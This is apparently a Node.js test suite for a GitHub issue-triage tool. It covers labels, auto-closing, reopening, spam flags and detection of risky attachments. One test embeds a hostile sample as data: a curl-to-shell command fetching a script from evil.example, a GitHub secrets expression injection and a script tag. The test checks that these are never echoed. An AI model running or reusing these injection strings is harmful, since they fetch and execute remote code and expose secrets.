import assert from 'node:assert/strict';
import { test } from 'node:test';
import { evaluate, parseSections, riskyAttachments } from './triage.mjs';

const now = new Date('2026-11-21T12:00:00Z');
const oldAccount = '2020-01-01T00:00:00Z';
const confirmation = '### Privacy\n\n- [X] I did not attach my documents or anything with personal information.';

const bugBody = (overrides = {}) => {
  const fields = {
    'What happened?': 'The merged file has the pages in the wrong order.',
    'Steps to reproduce': '1. Added two files\n2. Pressed Merge',
    'What did you expect?': 'Pages in the order I chose.',
    Tool: 'merge-pdf',
    ...overrides
  };
  return `${Object.entries(fields).map(([h, t]) => `### ${h}\n\n${t}`).join('\n\n')}\n\n${confirmation}`;
};

const input = (issue, extra = {}) => ({
  issue: { labels: ['bug', 'needs-triage'], state: 'open', authorAssociation: 'NONE', ...issue },
  authorCreatedAt: oldAccount,
  recentIssueCount: 1,
  previousReasons: [],
  now,
  ...extra
});

test('complete report from an established account gets no action', () => {
  const result = evaluate(input({ body: bugBody(), labels: ['bug'] }));
  assert.deepEqual(result, { addLabels: [], close: false, reopen: false, comments: [] });
});

test('missing confirmation closes the issue with one comment', () => {
  const body = bugBody().replace('- [X]', '- [ ]');
  const result = evaluate(input({ body }));
  assert.equal(result.close, true);
  assert.deepEqual(result.comments.map((c) => c.reason), ['missing-confirmation']);
});

test('edit that adds the confirmation reopens an issue closed by triage', () => {
  const result = evaluate(
    input({ body: bugBody(), state: 'closed' }, { previousReasons: ['missing-confirmation'] })
  );
  assert.equal(result.reopen, true);
  assert.equal(result.close, false);
  assert.deepEqual(result.comments, []);
});

test('repeated edits without confirmation do not repeat the comment', () => {
  const body = bugBody().replace('- [X]', '- [ ]');
  const result = evaluate(
    input({ body, state: 'closed' }, { previousReasons: ['missing-confirmation'] })
  );
  assert.equal(result.close, false);
  assert.deepEqual(result.comments, []);
});

test('empty required section or very short description needs triage', () => {
  const empty = evaluate(input({ body: bugBody({ 'Steps to reproduce': '_No response_' }), labels: ['bug'] }));
  assert.deepEqual(empty.addLabels, ['needs-triage']);
  const short = evaluate(input({ body: bugBody({ 'What happened?': 'broken' }), labels: ['bug'] }));
  assert.deepEqual(short.addLabels, ['needs-triage']);
});

test('new account is flagged but stays open', () => {
  const result = evaluate(input({ body: bugBody(), labels: ['bug'] }, { authorCreatedAt: '2026-11-19T00:00:00Z' }));
  assert.deepEqual(result.addLabels, ['needs-triage', 'possible-spam']);
  assert.equal(result.close, false);
});

test('fourth issue in 24 hours is flagged as a burst', () => {
  const third = evaluate(input({ body: bugBody(), labels: ['bug'] }, { recentIssueCount: 3 }));
  assert.deepEqual(third.addLabels, []);
  const fourth = evaluate(input({ body: bugBody(), labels: ['bug'] }, { recentIssueCount: 4 }));
  assert.deepEqual(fourth.addLabels, ['needs-triage', 'possible-spam']);
});

test('risky attachment is labeled and commented, never opened', () => {
  const body = bugBody({
    'What happened?':
      'See https://github.com/user-attachments/files/123/report.zip and https://github.com/user-attachments/assets/abc-def'
  });
  const result = evaluate(input({ body, labels: ['bug'] }));
  assert.deepEqual(result.addLabels, ['unsafe-attachment']);
  assert.deepEqual(result.comments.map((c) => c.reason), ['unsafe-attachment']);
});

test('images, videos and logs are allowed attachments', () => {
  const body = [
    'https://github.com/user-attachments/files/1/console.log',
    'https://github.com/user-attachments/files/2/screen.mp4',
    'https://github.com/user-attachments/assets/0f1e2d3c'
  ].join(' ');
  assert.deepEqual(riskyAttachments(body), []);
  assert.deepEqual(riskyAttachments('https://evil.example/payload.exe?x=1'), ['exe']);
});

test('hostile text is treated as data and never echoed in comments', () => {
  const hostile = '$(curl https://evil.example/x.sh | sh) ${{ secrets.TOKEN }} <script>alert(1)</script>';
  const body = bugBody({ 'What happened?': hostile }).replace('- [X]', '- [ ]');
  const result = evaluate(input({ body }));
  for (const { text } of result.comments) {
    assert.ok(!text.includes('curl'));
    assert.ok(!text.includes('secrets'));
    assert.ok(!text.includes('<script>'));
  }
  assert.equal(parseSections(body)['What happened?'], hostile);
});

test('maintainers are never triaged', () => {
  const body = 'Internal note without a form.';
  const result = evaluate(input({ body, labels: [], authorAssociation: 'OWNER' }));
  assert.deepEqual(result, { addLabels: [], close: false, reopen: false, comments: [] });
});

test('issue created without a form needs triage', () => {
  const result = evaluate(input({ body: `Something is wrong with the site.\n\n${confirmation}`, labels: [] }));
  assert.deepEqual(result.addLabels, ['needs-triage']);
});
